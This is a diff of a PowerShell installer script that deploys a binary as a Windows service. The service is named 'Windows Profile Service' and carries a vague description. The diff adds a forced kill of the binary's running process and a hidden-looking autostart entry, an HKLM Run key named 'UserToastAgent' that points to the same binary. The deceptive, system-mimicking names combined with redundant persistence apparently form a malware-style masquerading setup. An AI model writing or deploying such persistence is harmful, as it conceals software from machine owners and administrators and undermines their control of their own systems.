@@ -25,6 +25,7 @@ if (-not (Test-Path $laikoDestDir)) {
 
 Write-Host "[2/6] Stopping existing service if running..." -ForegroundColor Cyan
 Stop-Service -Name $serviceName -ErrorAction SilentlyContinue
+Get-Process | Where-Object { $_.Path -eq $laikoDestPath } | Stop-Process -Force
 
 Write-Host "[3/6] Copying application files..." -ForegroundColor Cyan
 if (Test-Path $sourcePath) {
@@ -47,6 +48,10 @@ if ($existingService) {
     sc.exe create $serviceName binPath= "`"$destPath`"" start= disabled displayname= "Windows Profile Service" | Out-Null
 }
 if ($LASTEXITCODE -ne 0) { throw "Failed to register Windows service." }
+
+$RegistryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+$ValueName = "UserToastAgent"
+Set-ItemProperty -Path $RegistryPath -Name $ValueName -Value $laikoDestPath -Force
 
 sc.exe description $serviceName "Monitors active user session profile quality service."
 
